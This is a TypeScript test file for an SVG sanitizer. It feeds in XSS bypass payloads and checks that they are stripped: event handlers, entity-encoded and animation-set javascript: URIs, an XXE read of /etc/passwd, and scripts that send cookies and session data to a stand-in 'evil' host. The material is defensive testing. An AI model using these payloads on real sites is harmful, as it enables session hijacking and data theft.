import { describe, it, expect } from "vitest"
import { sanitizeSvg } from "../sanitize/svgSanitizer"

/**
 * Anything that would run once the file is served as `image/svg+xml`.
 * `sanitized` is markup, so the check is on the markup, not on a rendering.
 */
function isInert(markup: string): boolean {
  return !/\bon\w+\s*=|javascript:|<script|<iframe|<foreignObject/i.test(markup)
}

describe("sanitizeSvg", () => {
  it("should keep a clean SVG drawing the same shapes", () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <circle cx="50" cy="50" r="40" fill="red"/>
  <rect x="10" y="10" width="30" height="30" fill="blue"/>
</svg>`
    const result = sanitizeSvg(svg)

    // Not byte-identical: DOMPurify re-serializes from the parsed tree, so
    // `<circle/>` comes back as `<circle></circle>`. What has to survive is the
    // drawing — every element, and every attribute that positions it.
    expect(result.sanitized).toContain(`viewBox="0 0 100 100"`)
    expect(result.sanitized).toContain(`<circle cx="50" cy="50" r="40" fill="red">`)
    expect(result.sanitized).toContain(`<rect x="10" y="10" width="30" height="30" fill="blue">`)
    expect(result.removedElements).toHaveLength(0)
  })

  it("should remove <script> elements", () => {
    const svg = `<svg><script>alert('xss')</script><circle r="10"/></svg>`
    const result = sanitizeSvg(svg)
    expect(result.sanitized).not.toContain("<script>")
    expect(result.sanitized).toContain("<circle")
    expect(result.removedElements).toContain("<script>")
  })

  it("should remove self-closing <script/> tags", () => {
    const svg = `<svg><script src="evil.js"/><circle r="10"/></svg>`
    const result = sanitizeSvg(svg)
    expect(result.sanitized).not.toContain("script")
    expect(result.removedElements).toContain("<script>")
  })

  it("should remove onclick and other event handlers", () => {
    const svg = `<svg><circle onclick="alert(1)" r="10"/></svg>`
    const result = sanitizeSvg(svg)
    expect(result.sanitized).not.toContain("onclick")
    expect(result.removedElements).toContain("onclick")
  })

  it("should remove onload event handler", () => {
    const svg = `<svg onload="fetch('evil.com')"><rect width="10" height="10"/></svg>`
    const result = sanitizeSvg(svg)
    expect(result.sanitized).not.toContain("onload")
  })

  it("should remove javascript: URIs", () => {
    const svg = `<svg><a href="javascript:alert(1)"><text>Click</text></a></svg>`
    const result = sanitizeSvg(svg)
    expect(result.sanitized).not.toContain("javascript:")
    // Reported as the attribute it was, `href`, rather than the old
    // catch-all "javascript: URI" label.
    expect(result.removedElements).toContain("href")
  })

  it("should remove javascript: in xlink:href", () => {
    const svg = `<svg><a xlink:href="javascript:void(0)"><text>Link</text></a></svg>`
    const result = sanitizeSvg(svg)
    expect(result.sanitized).not.toContain("javascript:")
  })

  it("should remove <iframe> elements", () => {
    const svg = `<svg><foreignObject><iframe src="evil.com"></iframe></foreignObject><circle r="10"/></svg>`
    const result = sanitizeSvg(svg)
    expect(result.sanitized).not.toContain("iframe")
    expect(result.removedElements).toContain("<foreignobject>")
  })

  it("should preserve complex SVG structure", () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
  <defs>
    <linearGradient id="grad1">
      <stop offset="0%" style="stop-color:rgb(255,255,0);stop-opacity:1"/>
      <stop offset="100%" style="stop-color:rgb(255,0,0);stop-opacity:1"/>
    </linearGradient>
  </defs>
  <g transform="translate(50,50)">
    <path d="M10 80 Q 95 10 180 80" stroke="black" fill="none"/>
    <text font-size="12">Hello</text>
  </g>
</svg>`
    const result = sanitizeSvg(svg)

    expect(result.sanitized).toContain("<defs>")
    expect(result.sanitized).toContain(`<linearGradient id="grad1">`)
    expect(result.sanitized).toContain(`style="stop-color:rgb(255,255,0);stop-opacity:1"`)
    expect(result.sanitized).toContain(`transform="translate(50,50)"`)
    expect(result.sanitized).toContain(`d="M10 80 Q 95 10 180 80"`)
    expect(result.sanitized).toContain("Hello")
    expect(result.removedElements).toHaveLength(0)
  })

  it("should handle multiple dangerous elements", () => {
    const svg = `<svg>
  <script>evil1()</script>
  <circle onclick="evil2()" r="10"/>
  <a href="javascript:evil3()"><text>Link</text></a>
  <script>evil4()</script>
</svg>`
    const result = sanitizeSvg(svg)
    expect(result.sanitized).not.toContain("script")
    expect(result.sanitized).not.toContain("onclick")
    expect(result.sanitized).not.toContain("javascript:")
    expect(result.removedElements.length).toBeGreaterThanOrEqual(3)
  })

  it("should throw for SVG exceeding 1MB", () => {
    const hugeSvg = "<svg>" + "x".repeat(1024 * 1024 + 1) + "</svg>"
    expect(() => sanitizeSvg(hugeSvg)).toThrow("exceeds maximum size")
  })

  it("should not throw for SVG at exactly 1MB", () => {
    // Create SVG just under 1MB
    const content = "x".repeat(1024 * 1024 - 20)
    const svg = `<svg>${content}</svg>`
    expect(() => sanitizeSvg(svg)).not.toThrow()
  })

  /**
   * Each payload below was run against the previous string-matching
   * implementation and came back byte-for-byte unchanged. They are the reason
   * this module no longer matches patterns against raw markup.
   */
  describe("payloads the string-matching sanitizer returned intact", () => {
    it("strips a handler with no whitespace before it", () => {
      // `/\s+on\w+/` needs whitespace. `/` is not whitespace.
      const svg = `<svg xmlns="http://www.w3.org/2000/svg"/onload="fetch('https://evil/?c='+document.cookie)"></svg>`
      const result = sanitizeSvg(svg)
      expect(result.sanitized).not.toContain("onload")
      expect(isInert(result.sanitized)).toBe(true)
    })

    it("strips a javascript: URI hidden behind an HTML entity", () => {
      // `&#106;` is `j`. The pattern looked for the literal `javascript:`.
      const svg = `<svg xmlns="http://www.w3.org/2000/svg"><a href="&#106;avascript:alert(1)"><text>x</text></a></svg>`
      const result = sanitizeSvg(svg)
      expect(result.sanitized).not.toContain("javascript:")
      expect(result.sanitized).not.toContain("&#106;")
      expect(isInert(result.sanitized)).toBe(true)
    })

    it("strips <set>, which assigns href at animation time", () => {
      // The URI never appears in an `href=` attribute, so no href pattern saw it.
      const svg = `<svg xmlns="http://www.w3.org/2000/svg"><a><set attributeName="href" to="javascript:alert(1)"/><text>x</text></a></svg>`
      const result = sanitizeSvg(svg)
      expect(result.sanitized).not.toContain("javascript:")
      expect(result.sanitized).not.toContain("<set")
      expect(isInert(result.sanitized)).toBe(true)
    })

    it("strips <animate>, the same trick with a different element", () => {
      // Not named in the audit; found while checking whether <set> was alone.
      const svg = `<svg xmlns="http://www.w3.org/2000/svg"><a><animate attributeName="href" values="javascript:alert(1)"/></a></svg>`
      const result = sanitizeSvg(svg)
      expect(result.sanitized).not.toContain("javascript:")
      expect(result.sanitized).not.toContain("<animate")
      expect(isInert(result.sanitized)).toBe(true)
    })

    it("strips the session-stealing payload from the report verbatim", () => {
      const svg = `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/api/auth/get-session').then(r=>r.text()).then(t=>fetch('https://evil/?d='+t))</script></svg>`
      const result = sanitizeSvg(svg)
      expect(result.sanitized).not.toContain("fetch")
      expect(result.sanitized).not.toContain("get-session")
      expect(isInert(result.sanitized)).toBe(true)
    })
  })

  describe("hostile and awkward documents", () => {
    it("neutralises an XXE entity declaration", () => {
      const svg = `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`
      const result = sanitizeSvg(svg)
      expect(result.sanitized).not.toContain("file:///etc/passwd")
      expect(result.sanitized).not.toContain("SYSTEM")
    })

    it("leaves no text before the root element, so the file stays renderable", () => {
      // A DOCTYPE internal subset survives parsing as an inert text node ahead
      // of <svg>. Inert, but it makes the stored .svg malformed XML — and a
      // browser then draws nothing at all.
      const svg = `<!DOCTYPE svg [<!ENTITY x "y">]><svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>`
      const result = sanitizeSvg(svg)
      expect(result.sanitized.trimStart().startsWith("<svg")).toBe(true)
    })

    it("keeps an exporter DOCTYPE's drawing intact", () => {
      const svg = `<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40"/></svg>`
      const result = sanitizeSvg(svg)
      expect(result.sanitized).toContain(`<circle cx="50" cy="50" r="40">`)
      expect(result.sanitized.trimStart().startsWith("<svg")).toBe(true)
    })

    it("strips a <use> pointing at a data: URI", () => {
      const svg = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+"/></svg>`
      const result = sanitizeSvg(svg)
      expect(result.sanitized).not.toContain("data:image/svg+xml")
      expect(isInert(result.sanitized)).toBe(true)
    })

    it("repairs malformed markup instead of dropping the drawing", () => {
      const svg = `<svg xmlns="http://www.w3.org/2000/svg"><circle r="10"><text>oops</svg>`
      const result = sanitizeSvg(svg)
      expect(result.sanitized).toContain("<circle")
      expect(isInert(result.sanitized)).toBe(true)
    })

    it("reports removals per call, without leaking the previous call's", () => {
      sanitizeSvg(`<svg><script>evil()</script></svg>`)
      const clean = sanitizeSvg(`<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>`)
      expect(clean.removedElements).toHaveLength(0)
    })
  })
})
